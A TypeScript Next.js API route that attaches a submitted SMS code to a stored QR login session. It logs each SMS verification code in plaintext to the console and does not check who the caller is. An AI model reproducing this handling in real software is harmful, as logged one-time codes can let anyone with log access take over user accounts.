import { NextRequest, NextResponse } from 'next/server';
import { qrSessions } from '@/lib/session-storage';

export async function POST(request: NextRequest) {
  try {
    const { sessionId, smsCode, method } = await request.json();
    
    if (!sessionId || !smsCode) {
      return NextResponse.json({ 
        success: false, 
        error: 'Session ID and SMS code are required' 
      }, { status: 400 });
    }

    // Find the existing session
    const session = qrSessions.get(sessionId);
    
    if (!session) {
      return NextResponse.json({ 
        success: false, 
        error: 'Session not found' 
      }, { status: 404 });
    }

    // Update the session with SMS code
    const updatedSession = {
      ...session,
      smsCode: smsCode,
      method: method || 'sms',
      updatedAt: new Date().toISOString()
    };
    
    // Store the updated session
    qrSessions.set(sessionId, updatedSession);
    
    console.log(`✅ Session ${sessionId} updated with SMS code: ${smsCode}`);
    
    return NextResponse.json({
      success: true,
      message: 'Session updated with SMS code',
      sessionId: sessionId
    });
    
  } catch (error) {
    console.error('Update Session SMS Error:', error);
    return NextResponse.json({ 
      success: false, 
      error: 'Failed to update session' 
    }, { status: 500 });
  }
} 